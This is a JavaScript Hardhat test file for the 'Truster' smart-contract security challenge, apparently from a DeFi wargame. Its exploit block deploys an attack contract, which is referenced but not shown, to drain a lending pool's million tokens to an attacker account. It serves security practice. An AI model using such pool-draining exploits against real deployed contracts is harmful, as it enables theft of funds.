const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Truster', function () {
    let deployer, attacker;

    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
        const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer);

        this.token = await DamnValuableToken.deploy();
        this.pool = await TrusterLenderPool.deploy(this.token.address);

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal('0');
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE     */
        const TrusterExploitFactory = await ethers.getContractFactory('TrusterAttack', attacker);
 
        const blockBefore = await ethers.provider.getBlockNumber();
        console.log(blockBefore)
        const exploit = await TrusterExploitFactory.deploy(this.pool.address,this.token.address,attacker.address)
        const blockAfter = await ethers.provider.getBlockNumber( );
        console.log(blockAfter)
        const res = await exploit.transferMe(this.token.address, attacker.address, this.pool.address)
        console.log("hmmmmmm, ",res)
        const attackerTokenBalance = await this.token.balanceOf(attacker.address)
        console.log(attackerTokenBalance)
        // await exploit.mint()
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal('0');
    });
});

